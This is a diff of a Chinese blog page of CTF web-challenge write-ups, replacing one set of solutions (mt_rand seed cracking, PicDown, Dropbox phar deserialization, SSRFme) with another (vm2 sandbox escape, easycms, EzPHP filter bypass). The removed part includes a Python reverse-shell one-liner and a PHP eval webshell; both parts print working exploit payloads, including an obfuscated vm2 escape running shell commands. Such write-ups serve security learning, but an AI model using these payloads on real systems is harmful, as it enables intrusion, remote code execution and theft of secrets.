@@ -164,338 +164,255 @@
     </div>
     
     <div class="content" v-pre>
-        <p>[GWCTF 2019]枯燥的抽奖</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240602143438527.png" alt="image-20240602143438527"></p>
-<p>我枯燥你（）</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240602143503314.png" alt="image-20240602143503314"></p>
-<p>源代码让我们查看check.php</p>
-<p>听话</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240602143535942.png" alt="image-20240602143535942"></p>
-<p>mt_srand</p>
-<p>伪随机数是吧</p>
-<h4 id="mt-srand"><a href="#mt-srand" class="headerlink" title="mt_srand"></a>mt_srand</h4><p>mt_srand() 函数播种 Mersenne Twister <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8&spm=1001.2101.3001.7020">随机数生成器</a>。<br>提示：从 PHP 4.2.0 开始，随机数生成器自动播种，因此没有必要使用该函数。当不使用随机数播种函数srand时，php也会自动为随机数播种，因此是否确定种子都不会影响正常运行。</p>
-<p>也就是我们所说的种子</p>
-<p>一个种子对应一串字符</p>
-<p>知道种子就能知道字符，知道字符就能知道种子</p>
-<p>所以我们开始求种子</p>
-<h4 id="下载php-mt-seed工具并且使用"><a href="#下载php-mt-seed工具并且使用" class="headerlink" title="下载php_mt_seed工具并且使用"></a>下载php_mt_seed工具并且使用</h4><p>下载链接：<a target="_blank" rel="noopener" href="https://www.openwall.com/php_mt_seed/">php_mt_seed - PHP mt_rand() seed cracker</a></p>
-<p><img src="https://img-blog.csdnimg.cn/d75c66b483de4f28a0151f7759479ff6.png" alt="在这里插入图片描述"><br>下载后，放入linux环境，并且运行</p>
-<p>在此之前，要先将字符转化为mt_seed可识别的样子</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$allowable_characters = &#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;;</span><br><span class="line">$len = strlen($allowable_characters) - 1;</span><br><span class="line">$pass = &quot;Yb5Uor04iN&quot;;</span><br><span class="line">for ($i = 0; $i &lt; strlen($pass); $i++) &#123;</span><br><span class="line">    $number = strpos($allowable_characters, $pass[$i]);</span><br><span class="line">    echo &quot;$number $number 0 $len  &quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+        <p>[HFCTF2020]JustEscape</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212114789.png" alt="image-20240621211441703"></p>
+<p>真的是php？</p>
+<p>不懂</p>
+<p>看到wp中大佬说是vm沙盒，先照着做吧</p>
+<p>当code为空时</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( array_key_exists( &quot;code&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;code&#x27; ] != NULL ) &#123;</span><br><span class="line">    $code = $_GET[&#x27;code&#x27;];</span><br><span class="line">    echo eval(code);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240602143844987.png" alt="image-20240602143844987"></p>
-<p>发现种子</p>
-<p>之后执行代码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(467497519);</span><br><span class="line">$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str=&#x27;&#x27;;</span><br><span class="line">$len1=20;</span><br><span class="line">for ( $i = 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;.$str.&quot;&lt;/p&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>所以是一个获取键什么的</p>
+<p>这里尝试一下</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212118781.png" alt="image-20240621211843751"></p>
+<p>发现一长串报错</p>
+<p><strong>error.stack</strong>可以简单解释为用alert()弹出console.log()的一样的异常堆栈信息</p>
+<p>在github上可以找到破坏沙盒的方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">const &#123;VM&#125; = require(&#x27;vm2&#x27;);</span><br><span class="line">const untrusted = &#x27;(&#x27; + function()&#123;</span><br><span class="line">	TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">	try&#123;</span><br><span class="line">		Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;</span><br><span class="line">	&#125;catch(e)&#123;</span><br><span class="line">		return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;+&#x27;)()&#x27;;</span><br><span class="line">try&#123;</span><br><span class="line">	console.log(new VM().run(untrusted));</span><br><span class="line">&#125;catch(x)&#123;</span><br><span class="line">	console.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>运行拿到字符串</p>
-<p>直接</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240602144156759.png" alt="image-20240602144156759"></p>
-<p>拿下！！！</p>
-<p>[网鼎杯 2020 白虎组]PicDown</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240602193405974.png" alt="image-20240602193405974"></p>
-<p>不是，你这，我那</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240602193418102.png" alt="image-20240602193418102"></p>
-<p>这就？</p>
-<p>啊！？</p>
-<p>反正肯定不是预期解，看看真正的解法吧</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">读取</span><br><span class="line">/proc/self/environ</span><br><span class="line">/proc/self/cmdline    </span><br></pre></td></tr></table></figure>
+<p>其中选用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">	TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">	try&#123;</span><br><span class="line">		Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;</span><br><span class="line">	&#125;catch(e)&#123;</span><br><span class="line">		return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString();</span><br><span class="line">	&#125;)()</span><br></pre></td></tr></table></figure>
 
-<p>得到</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240602193613205.png" alt="image-20240602193613205"></p>
-<p>读取app.py，得到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, Response</span><br><span class="line">from flask import render_template</span><br><span class="line">from flask import request</span><br><span class="line">import os</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = &quot;/tmp/secret.txt&quot;</span><br><span class="line">f = open(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line">//定义secretkey，然后删除</span><br><span class="line">//但是没有关闭，所以可以在/proc/self/fd/xxx中找到</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;search.html&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/page&#x27;)</span><br><span class="line">def page():</span><br><span class="line">    url = request.args.get(&quot;url&quot;)</span><br><span class="line">    try:</span><br><span class="line">        if not url.lower().startswith(&quot;file&quot;):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=&#x27;application/octet-stream&#x27;)</span><br><span class="line">            response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=beautiful.jpg&#x27;</span><br><span class="line">            return response</span><br><span class="line">        else:</span><br><span class="line">            value = &quot;HACK ERROR!&quot;</span><br><span class="line">    except:</span><br><span class="line">        value = &quot;SOMETHING WRONG!&quot;</span><br><span class="line">    return render_template(&#x27;search.html&#x27;, res=value)</span><br><span class="line">//定义了一个文件读取的功能</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/no_one_know_the_manager&#x27;)</span><br><span class="line">def manager():</span><br><span class="line">    key = request.args.get(&quot;key&quot;)</span><br><span class="line">    print(SECRET_KEY)</span><br><span class="line">    if key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(&quot;shell&quot;)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = &quot;ok&quot;</span><br><span class="line">    else:</span><br><span class="line">        res = &quot;Wrong Key!&quot;</span><br><span class="line"></span><br><span class="line">    return res</span><br><span class="line">//传两个参数，如果key == SECRET_KEY，那么就可以执行命令，但是没有回显，可以用来反弹shell.</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>但是我们可以发现其中有些字符被过滤，所以，我们通过重写替换</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(function ()&#123;</span><br><span class="line">    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return this.proces`&#125;s`&#125;`)();</span><br><span class="line">    try&#123;</span><br><span class="line">        Object.preventExtensions(Buffer.from(``)).a = 1;</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
 
-<p>所以读取一下key</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/proc/self/fd/3</span><br></pre></td></tr></table></figure>
+<p>prototyp  &#x3D;&gt; [<code>$&#123;</code>${<code>prototyp</code>}e<code>&#125;</code>]<br>get_process &#x3D;&gt; [<code>$&#123;</code>${<code>get_proces</code>}s<code>&#125;</code>]<br>require &#x3D;&gt; [<code>$&#123;</code>${<code>requir</code>}e<code>&#125;</code>]<br>child_process &#x3D;&gt; <code>$&#123;</code>${<code>child_proces</code>}s<code>&#125;</code><br>execSync &#x3D;&gt; [<code>$&#123;</code>${<code>exe</code>}cSync<code>&#125;</code>]</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212127520.png" alt="image-20240621212758486"></p>
+<p>得到flag</p>
+<p>[GXYCTF2019]StrongestMind</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212012626.png" alt="image-20240621201241587"></p>
+<p>我一开始想过会很难，但是没想到真是写一千次，直接脚本运行！</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from requests import *</span><br><span class="line">import time</span><br><span class="line">import re</span><br><span class="line">url = &quot;http://dbbc5a26-5ac4-43d7-8540-ecfdbd1f1879.node5.buuoj.cn:81/&quot;</span><br><span class="line">s=session()</span><br><span class="line">kk = re.compile(r&#x27;\d+ [-|+] \d+&#x27;)</span><br><span class="line">r=s.get(url)</span><br><span class="line"></span><br><span class="line">for i in range(1001):</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    zz=kk.findall(r.text)[0]</span><br><span class="line">    #print(zz)</span><br><span class="line">    zzz=eval(zz)</span><br><span class="line">    #print(zzz)</span><br><span class="line">    data=&#123;&quot;answer&quot;:zzz&#125;</span><br><span class="line">    time.sleep(0.1)</span><br><span class="line">    </span><br><span class="line">    r=s.post(url,data=data)</span><br><span class="line">    </span><br><span class="line">    r.encoding=&#x27;utf-8&#x27;</span><br><span class="line">    </span><br><span class="line">    print((r.text))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>这数字是一个一个试，试到三就行</p>
-<p>读取到TqaOFuu2Sk29nB9Pc2s5wPKrWv&#x2F;jknWSId5SFyNg7A4&#x3D;</p>
-<p>所以进行shell反弹</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp 3333</span><br><span class="line"></span><br><span class="line">/no_one_know_the_manager?key=lxzY3xvJIDngLAx7RogcmxYWJX5MOWEKSCyT36xso7k=&amp;shell=python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;ip&#x27;,3333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure>
 
-<p>反弹之后直接cat就好</p>
-<p>[CISCN2019 华北赛区 Day1 Web1]Dropbox</p>
-<p>我能说什么呢？好题，至少对于我这个新手真的震惊到了</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240603204833820.png" alt="image-20240603204833820"></p>
-<p>首先是干吗呢？</p>
-<p>是尝试一下注入，发现没用所以开始疯狂抓包</p>
-<p>在点到下载的时候蹦出来</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240603204936007.png" alt="image-20240603204936007"></p>
-<p>也就是说filename任我写是吧，所以我们开始找一些可以找到的文件</p>
-<p>捕捉的到的话，一个注册，一个登录，一个上传文件，一个下载，一个删除</p>
-<p>也就是</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../register.php</span><br><span class="line">../../login.php</span><br><span class="line">../../upload.php</span><br><span class="line">../../download.php</span><br><span class="line">../../delete.php</span><br></pre></td></tr></table></figure>
 
-<p>考验你英语词汇的时候到了</p>
-<p>在这些文件里又发现了一个class.php‘</p>
-<p>一起下下来</p>
-<p>之后就是长长的审计代码</p>
-<p>发现几个有用消息</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240603205332955.png" alt="image-20240603205332955"></p>
-<p>格式限制</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240603205402910.png" alt="image-20240603205402910"></p>
-<p>不能上传带flag的文件</p>
-<p>还有，就是</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240603205515097.png" alt="image-20240603205515097"></p>
-<p>发现两个魔术头</p>
-<p>一个call一个destruct</p>
-<p>怎么说呢</p>
-<p>__call()魔术方法会在对象调用的方法不存在时，自动执行</p>
-<p>所以我们后续要照一照有没有调用不存在的对象</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240603211219708.png" alt="image-20240603211219708"></p>
-<p>在index.php里</p>
-<p>还有一个就是</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240603205822773.png" alt="image-20240603205822773"></p>
-<p>也就是说，我只有可能从这个读到数据呗</p>
-<p>而在destruct中应用了</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240603210024082.png" alt="image-20240603210024082"></p>
-<p>所以说，emm</p>
-<p>我们要想办法使用到这个</p>
-<p>接下来就是重点</p>
-<h4 id="phar文件"><a href="#phar文件" class="headerlink" title="phar文件"></a>phar文件</h4><p>这个文件的特点就是将一个学历恶化的对象存储到phar文件中生成之后，即使更改文件格式，也不会影响作用，之后再通过phar:&#x2F;&#x2F;协议去访问，就可以反序列化</p>
-<p>也就是说，我们需要</p>
-<p>创建一个phar文件，存储序列化对象，并在最后通过协议去读取</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User &#123;</span><br><span class="line">    public $db;</span><br><span class="line">&#125;</span><br><span class="line">class File &#123;</span><br><span class="line">    public $filename;</span><br><span class="line">&#125;</span><br><span class="line">class FileList &#123;</span><br><span class="line">    private $files;</span><br><span class="line">    private $results;</span><br><span class="line">    private $funcs;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        $this-&gt;files = array();</span><br><span class="line">        $this-&gt;results = array();</span><br><span class="line">        $this-&gt;funcs = array();</span><br><span class="line"></span><br><span class="line">        $file = new File();</span><br><span class="line">        $file-&gt;filename = &#x27;/flag.txt&#x27;;	# 这里的flag.txt是多次猜测出来的</span><br><span class="line">        array_push($this-&gt;files, $file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user = new User();</span><br><span class="line">$filelist = new FileList();</span><br><span class="line">$user-&gt;db = $filelist;</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);  //设置stub，增加gif文件头</span><br><span class="line">$phar-&gt;setMetadata($user); //将自定义的meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">//签名自动计算</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>[GKCTF 2021]easycms</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406211945743.png" alt="image-20240621194533640"></p>
+<p>给我整懵了，我差点以为我点到了其它网站了。</p>
+<p>看了眼提示，弱密码五位</p>
+<p>在界面四处找了找，发现没有登陆界面，所以扫文件</p>
+<p>发现admin.php</p>
+<p>所以访问</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406211948154.png" alt="image-20240621194846104"></p>
+<p>弱密码，可以慢慢试，也可以bp</p>
+<p>但是文件名叫admin诶</p>
+<p>尝试，最后发现是</p>
+<p>admin&#x2F;12345</p>
+<p>登录成功</p>
+<p>之后在界面里逛逛，发现了一个可以上传文件的地方</p>
+<p>在设计-&gt;主题-&gt;导入主题</p>
+<p>但是</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406211950028.png" alt="image-20240621195039994"></p>
+<p>所以，我们要找地方，创建文件</p>
+<p>所以就是要找可以创建或者上传文件的地方对吧</p>
+<p>按照这个思路，我们可以找到</p>
+<p>设计-&gt;组件-&gt;素材库</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406211952714.png" alt="image-20240621195220695"></p>
+<p>随便上传一个txt上去</p>
+<p>之后进行编辑</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406211953189.png" alt="image-20240621195311156"></p>
+<p>现在的界面的话要更改存储路径来创建一个新文件</p>
+<p>根据上文的文件，猜测</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../../system/tmp/tfeh</span><br></pre></td></tr></table></figure>
 
-<p>脚本如下（直接下到脚本所在文件夹）</p>
-<p>之后，上传读取即可</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240603211730723.png" alt="image-20240603211730723"></p>
-<p>读取方式：</p>
-<p>先上传，再删除，抓包，再使用伪协议读取，触发反序列化，读取flag</p>
-<p>[HITCON 2017]SSRFme</p>
-<p>一进题目就是源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">        $http_x_headers = explode(&#x27;,&#x27;, $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]);</span><br><span class="line">        $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $http_x_headers[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line"></span><br><span class="line">    $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">    $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info = pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[&quot;basename&quot;]), $data);</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212001660.png" alt="image-20240621200101620"></p>
+<p>也就是说，我们现在有这个文件了</p>
+<p>所以我们开始猜测怎么爆flag出来</p>
+<p>根据上面的，我们猜测这个flag应该和主题有关</p>
+<p>所以我们去主题里面看看</p>
+<p>随便选择一个主题</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212004631.png" alt="image-20240621200410599"></p>
+<p>在这一行里面我们都能看到一个</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212004630.png" alt="image-20240621200438587"></p>
+<p>那就很简单了，php源码搞一手</p>
+<p>我直接cat &#x2F;flag了</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212005229.png" alt="image-20240621200508201"></p>
+<p>之后返回主题，或者在右上角的可视化编辑里面看到页面</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212005045.png" alt="image-20240621200540019"></p>
+<p>我是放在友链里，在其它板块也是可以的</p>
+<p>[BJDCTF2020]EzPHP’</p>
+<p>查看源代码</p>
+<p>发现</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202042149.png" alt="image-20240620204218107"></p>
+<p>base32解码，得1nD3x.php</p>
+<p>访问，得到一长串代码，分开来一个个读（因为很像一关关闯关）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($_SERVER) &#123; </span><br><span class="line">  if (</span><br><span class="line">    preg_match(&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;])</span><br><span class="line">    ) </span><br><span class="line">    die(&#x27;You seem to want to do something bad?&#x27;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>一眼丁真</p>
-<p>因为之前有见过sandbox和mkdir的组合技，所以看出来了，就是说我们会创建一个文件叫做sandbox&#x2F;xxx</p>
-<p>但是，这道题有几个没见过的函数</p>
-<h4 id="chdir"><a href="#chdir" class="headerlink" title="chdir"></a>chdir</h4><p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240604171616901.png" alt="image-20240604171616901"></p>
-<p>也就是说改变当前目录改为sandbox&#x2F;xxx</p>
-<p>再完后看，看到了神奇的东西</p>
-<p>shell_exec这可是好东西，也就是说可以光明正大的命令执行了</p>
-<p>之后还有</p>
-<h4 id="pathinfo"><a href="#pathinfo" class="headerlink" title="pathinfo"></a>pathinfo</h4><p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240604171854910.png" alt="image-20240604171854910"></p>
-<p>也就是说可以字典化</p>
-<p>借一篇wp的演示</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(pathinfo(&#x27;sandox/cfbb870b58817bf7705c0bd826e8dba7/123&#x27;));</span><br><span class="line">=&gt;</span><br><span class="line">array(3) &#123;</span><br><span class="line">  [&quot;dirname&quot;]=&gt;</span><br><span class="line">  string(39) &quot;sandox/cfbb870b58817bf7705c0bd826e8dba7&quot;</span><br><span class="line">  [&quot;basename&quot;]=&gt;</span><br><span class="line">  string(3) &quot;123&quot;</span><br><span class="line">  [&quot;filename&quot;]=&gt;</span><br><span class="line">  string(3) &quot;123&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>啊，基本上全部ban掉了啊</p>
+<p>怎么办…</p>
+<p>在这里我们可以将要上传的东西进行url编码，因为$_SERVER[‘QUERY_STRING’]不会解码url</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (!preg_match(&#x27;/http|https/i&#x27;, $_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    if (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123; </span><br><span class="line">        $file = $_GET[&quot;file&quot;]; </span><br><span class="line">        echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; else die(&#x27;fxck you! What do you want to do ?!&#x27;);</span><br></pre></td></tr></table></figure>
 
-<p>最后就是和之前那个mkdir经常一起出现的，毕竟新创立一个文件夹肯定要写点东西进去才能做一些奇奇怪怪的事情</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240604172338640.png"></p>
-<p>所以我们要传入</p>
-<p>url：执行命令</p>
-<p>filename：创建的文件名</p>
-<p>所以我们可以很快反应出来，可以任意命令执行</p>
-<p>爽了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=data://text/plain,&lt;?php @eval($_POST[&#x27;2&#x27;]);?&gt;&amp;filename=flag.php</span><br></pre></td></tr></table></figure>
+<p>之后就是要上传debu，满足debu的值为**&#x2F;^aqua_is_cute$&#x2F;<strong>，但是不能强等于</strong>aqua_is_cute**所以我们可以采用%0a换行符进行绕过，同时url绕过黑名单，所以payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb%75=aq%75a_is_c%75te%0a//%75=u</span><br></pre></td></tr></table></figure>
 
-<p>传输上去之后就说明你已经写入了，接下来就是读文件时刻</p>
-<p>怎么读文件呢？</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br></pre></td></tr></table></figure>
+<p>之后</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($_REQUEST) &#123; </span><br><span class="line">    foreach($_REQUEST as $value) &#123; </span><br><span class="line">        if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))  </span><br><span class="line">            die(&#x27;fxck you! I hate English!&#x27;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>也就是说有一个沙盒叫做</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sandbox/xxx</span><br><span class="line">//xxx=md5(&quot;orange&quot;.&quot;ip&quot;)</span><br></pre></td></tr></table></figure>
+<p>$_REQUEST也就是说我们可以传get和post，同时，post优先级高于get，所以可以在个体传入之后用post覆盖</p>
+<p>该阶段payload如下：</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202051044.png" alt="image-20240620205138007"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;)</span><br><span class="line">    die(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;);</span><br></pre></td></tr></table></figure>
 
-<p>构建一个小脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$sandox=&quot;sandbox/&quot; . md5(&quot;orange&quot;.&quot;223.147.3.51&quot;);</span><br><span class="line">echo $sandox;</span><br><span class="line">//sandbox/70fe05dce7bd92f0eb22d188342095c2（我的）</span><br></pre></td></tr></table></figure>
+<p>也就是说要能读取到debu_debu_aqua</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=data://text/plain.deb%75_deb%75_aq%75a</span><br></pre></td></tr></table></figure>
 
-<p>所以，我们就直接蚁剑连接</p>
-<p>找到flag和readflag</p>
-<p>分别读取一下，发现readflag是可以的</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240604212937666.png" alt="image-20240604212937666"></p>
